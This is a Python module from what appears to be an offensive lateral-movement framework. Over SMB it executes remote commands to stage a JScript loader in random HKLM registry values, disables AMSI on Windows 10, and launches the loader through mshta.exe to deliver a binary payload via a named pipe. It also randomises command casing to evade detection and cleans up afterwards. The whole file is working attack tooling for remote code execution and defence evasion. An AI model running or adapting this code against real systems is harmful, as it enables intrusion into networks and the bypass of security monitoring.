# -*- coding: UTF-8 -*-

import logging
import os
import time

from tqdm import tqdm

from framework import utils
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.helpers import ServiceHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Service + mshta.exe + reg.exe + JScript (7+)"

    local_loader_path = None
    register_key = None
    added_register_key = False

    is_win10 = True
    disabled_amsi = False
    started_mshta = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "jscript.js")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ServiceHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        try:
            if self.smb_conn.getServerOSMajor() < 10:
                self.is_win10 = False
        except:
            pass

        self.register_key = utils.get_random_name()

        with open(self.local_loader_path, 'rb') as f:
            content = f.read()
        content = content.replace('PIPE_NAME_IS_HERE', self.pipe_name)

        max_data_in_value = 7000
        num_of_value = 0
        progress_bar = None
        for i in range(0, len(content), max_data_in_value):
            content_in_value = content[i:i + max_data_in_value]
            command = '{0}{1} /v {2} /d "{3}" /f'.format(
                utils.random_case("reg add hklm\\software\\"), self.register_key, num_of_value, content_in_value)
            self.helper.execute_command(command)
            self.added_register_key = True
            num_of_value += 1
            if progress_bar is None:
                logging.info("Adding script: hklm\\software\\{}".format(self.register_key))
                progress_bar = tqdm(
                    total=len(range(0, len(content), max_data_in_value)),
                    ncols=80,
                    bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} commands")
            progress_bar.update(1)
            time.sleep(0.5)
        progress_bar.close()

        if self.is_win10:
            try:
                command = utils.command_disable_amsi_script()
                self.helper.execute_command(command)
                logging.info("Disabled AMSI: {}".format(command))
                self.disabled_amsi = True
            except Exception as e:
                logging.error("Error in trying to disable AMSI: {}".format(e))

        logging.info("Executing script with mshta")
        command = utils.command_mshta_with_reg(self.opts, self.register_key, num_of_value)
        self.helper.execute_command(command)
        self.started_mshta = True

        utils.sleep(3)

    def clean_up(self):
        if self.started_mshta:
            try:
                command = "wmic process where \"name='mshta.exe' " \
                          "and commandline like '%{}%'\" " \
                          "call terminate".format(self.register_key)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)
        if self.added_register_key:
            try:
                command = '{0}{1} /f'.format(utils.random_case("reg delete hklm\\software\\"), self.register_key)
                self.helper.execute_command(command)
                logging.info("Deleted: hklm\\software\\{}".format(self.register_key))
            except Exception as e:
                logging.error(e)
        if self.is_win10:
            if self.disabled_amsi:
                try:
                    command = utils.command_enable_amsi_script()
                    self.helper.execute_command(command)
                except Exception as e:
                    logging.error(e)
        self.helper.clean_up()
